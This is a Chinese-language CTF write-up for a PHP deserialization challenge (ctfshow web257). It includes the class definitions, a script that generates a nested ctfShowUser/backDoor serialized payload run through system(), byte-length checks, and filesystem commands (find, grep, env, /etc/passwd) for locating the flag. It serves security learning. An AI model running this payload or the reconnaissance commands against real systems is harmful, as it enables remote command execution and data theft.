## 一句话概括

`ctfShowUser` 里有个 **`private $class`** 属性，默认指向 `backDoor` 对象；而 `backDoor` 里藏着 **`$code`**（一个会被 `system()` 执行的命令串）。反序列化会把这两个对象的嵌套关系原样恢复，于是「构造一个 `ctfShowUser`，让它内部的 `$class->code` 是我们的命令」就能拿到命令执行 —— 剩下的只是**把 flag 文件找出来**。

## 本题情景与解题手法

> 原笔记 `web257创造payload以及查询文件路径.md` 保留了**两段类定义**与**一段生成脚本**，但没有保留 `backDoor` 里真正**执行 `$code` 的那一行**（出口是 `$code` 进命令执行，这点明确；具体是 `__destruct()` 还是别的方法未能还原）。下面按笔记给出的结构整理。

### 题目形态（按笔记保留的类定义）

```php
<?php
class ctfShowUser {
    private $username = 'xxxxxx';
    private $password = 'xxxxxx';
    private $isVip    = true;
    private $class;                    // ★ 指向另一个对象

    public function __construct() {
        $this->class = new backDoor(); // 正常业务：class 是 backDoor 实例
    }
}

class backDoor {
    private $code = "system('tac flag.php');";   // ★ 出口：命令串
}
?>
```

危险点很直观：**`$code` 的值最终会被送进命令执行**。而它是个 `private` 属性 —— 普通调用改不了，但**反序列化可以**。

### 第一步：找出口与入口

- **出口**：`backDoor::$code`（命令串 → 命令执行）；
- **入口**：题目对 `ctfShowUser` 做 `unserialize()`（笔记未保留调用行，但 payload 的存在说明入口可控）。

### 第二步：认清「嵌套」这层结构

`ctfShowUser` 的 `$class` 属性值就是**另一个对象** `backDoor`。序列化时这种嵌套会被**递归写成一个 `O:8:"backDoor":...`**，反序列化时又原样恢复。所以威胁不是「一个类」，而是「两个类通过属性串起来」，这正是 **05 篇 POP 链**的物理形态（嵌套即链）。

### 第三步：构造 payload

最稳的生成方式就是**直接用类定义跑一遍 `serialize()`**（把 `$code` 改成想要的命令）：

```php
<?php
class ctfShowUser {
    private $username = 'xxxxxx';
    private $password = 'xxxxxx';
    private $isVip    = true;
    private $class;
    public function __construct() { $this->class = new backDoor(); }
}
class backDoor {
    private $code = "system('tac flag.php');";   // ★ 换成要执行的命令
}
echo urlencode(serialize(new ctfShowUser()));
?>
```

反序列化串（**含真实 NUL 字节**，`\0` 各算 1 字节）：

```text
O:11:"ctfShowUser":4:{s:21:"\0ctfShowUser\0username";s:6:"xxxxxx";s:21:"\0ctfShowUser\0password";s:6:"xxxxxx";s:18:"\0ctfShowUser\0isVip";b:1;s:18:"\0ctfShowUser\0class";O:8:"backDoor":1:{s:14:"\0backDoor\0code";s:23:"system('tac flag.php');";}}
```

长度逐项核对（**`private` 属性的前缀是把名字算进去的**）：

| 字段 | 值 | 字节数 | 核对 |
|---|---|---|---|
| 类名 | `ctfShowUser` | 11 | `O:11:` ✓ |
| 属性个数 | —— | 4 | `:4:` ✓ |
| `private` 名 | `\0ctfShowUser\0username` | 1+11+1+8 = **21** | `s:21:` ✓ |
| `private` 名 | `\0ctfShowUser\0isVip` | 1+11+1+5 = **18** | `s:18:` ✓ |
| `private` 名 | `\0ctfShowUser\0class` | 1+11+1+5 = **18** | `s:18:` ✓ |
| 内层类名 | `backDoor` | 8 | `O:8:` ✓ |
| `private` 名 | `\0backDoor\0code` | 1+8+1+4 = **14** | `s:14:` ✓ |
| 命令串 | `system('tac flag.php');` | **23** | `s:23:` ✓ |

> `\0` 在 URL 里要写成 `%00`，所以提交时是 `s:21:"%00ctfShowUser%00username";...`。

### 第四步：先把「flag 在哪」探出来

命令执行拿到后，**不要一上来就 `cat flag.php`** —— 先侦察路径。原笔记的实战顺序：

```bash
system('ls -la');          # 发现当前目录下直接有 flag.php
system('tac flag.php');    # 直接读（tac 会把文件倒序输出，省得被 echo/日志吃掉）
```

如果 `ls -la` 里**没看到 flag**，按下面的清单系统性地找（这里只列思路，**具体脚本见 04-文件上传 / 找flag的辅助脚本**，避免重复）：

| 方向 | 命令 | 关注点 |
|---|---|---|
| 扩范围列目录 | `ls -la /` `/root` `/home` `/var` `/tmp` | `root` / `home/*` / `flag` 字样 |
| 全盘搜文件名 | `find / -name "*flag*" 2>/dev/null` | `*.txt` 也一并搜 |
| 搜 Web 目录 | `find /var/www -type f 2>/dev/null` | flag 常在 web 根附近 |
| 搜内容 | `grep -rl "ctfshow" / 2>/dev/null` | 知道 flag 前缀时最好用 |
| 环境变量 | `env \| grep -i flag` | 有些题 flag 放环境变量 |
| 配置文件 | `find / -name "*.env" -o -name "config.*" 2>/dev/null` | 顺带看 `/etc/passwd` |

本题的结论是**flag 就在当前目录**（`ls -la` 直接看到 `flag.php`，所以用 `tac flag.php` 即可）。

### 第五步：把 payload 丢进入口

URL 编码后的 payload 放进题目接收参数的字段，触发 `unserialize()` → 恢复出嵌套的 `ctfShowUser → backDoor` 对象图 → `$code` 被送进 `system()` → 命令执行回显。

### 注入手法一句话总结

> **`ctfShowUser::$class` 是嵌套的 `backDoor` 对象** → `backDoor::$code` 进命令执行 → 把两个 `private` 属性名写成 `\0类名\0属性名`、长度算满 → 生成嵌套 `O:11:"ctfShowUser":4:{...O:8:"backDoor":1:{...}}` → 反序列化恢复对象图 → `$code` 执行 → 先 `ls` 定位、再 `tac` 读 flag。

## 利用条件

1. **入口可控**：有 `unserialize()` 接收攻击者数据；
2. **嵌套关系成立**：外层类里有属性指向内层对象，且内层对象的某个属性会被送进危险函数；
3. **`private` / `protected` 属性名要带 `\0` 前缀并算准长度**（这是本题最容易翻车的点）；
4. **有文件读取 / 命令执行的出口**（本题 `system`），且知道或能探出目标文件路径。

## Payload 速查

| 目的 | 写法 |
|---|---|
| 外层对象 | `O:11:"ctfShowUser":4:{...}` |
| `private` 属性名（带 NUL） | `s:18:"%00ctfShowUser%00class";` |
| 内层对象 | `O:8:"backDoor":1:{s:14:"%00backDoor%00code";s:23:"system('tac flag.php');";}` |
| 生成（推荐） | 用题目类定义 `echo urlencode(serialize(new ctfShowUser()));`，只改 `$code` |
| 找 flag | `system('ls -la');` → 找不到再 `find / -name "*flag*"` |
| 读 flag | `system('tac flag.php');` |

## 踩坑与备注

- **`private` 属性的长度是「`\0` + 类名 + `\0` + 属性名」**：`\0ctfShowUser\0class` 是 **18** 不是 10，也不是 11。用 `serialize()` 生成就不会错（见 01 / 05 篇）。
- **URL 编码时 `\0` 写 `%00`，但 `http_build_query` / cookie 里要按目标场景选择真实 NUL 还是 `%00`**：GET 参数用 `%00`；若外层还套了 `base64_encode`，则必须用**真实 NUL 字节**参与编码（见 06 / 07 篇）。
- **`tac` 而不是 `cat`**：`tac` 倒序输出文件，某些题的回显过滤会把开头的关键字吞掉，倒序常能绕过；也可用 `nl` / `sed -n` 等替代。
- **先侦察再读文件**：直接猜 `cat flag.php` 可能路径不对、白跑一趟；`ls -la` + `find` 是标准动作。
- **找 flag 的完整脚本**在 **04-文件上传 / 找flag的辅助脚本**，本题只讲利用链，脚本细节不重复。
- **原笔记给的靶机信息已抽象**：文中不再出现任何真实 UUID / 靶机域名，统一写作 `靶机地址`。
- **原笔记只保留了类定义，未保留 `backDoor` 的执行方法行**：本文据「`$code` 会被执行」这一明确结论展开，具体调用点（`__destruct` / 业务方法）未做断言。
